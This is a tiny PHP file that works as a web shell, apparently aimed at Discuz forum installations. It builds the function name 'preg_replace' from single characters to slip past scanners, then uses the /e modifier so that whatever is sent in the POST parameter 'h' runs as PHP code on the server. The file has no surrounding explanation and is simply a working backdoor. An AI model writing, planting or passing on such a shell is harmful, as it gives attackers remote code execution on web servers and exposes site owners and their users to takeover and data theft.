<?php
	$gzid = "p"."r"."e"."g"."_"."r"."e"."p"."l"."a"."c"."e";
	$gzid("/[discuz]/e",$_POST['h'],"Access");
?>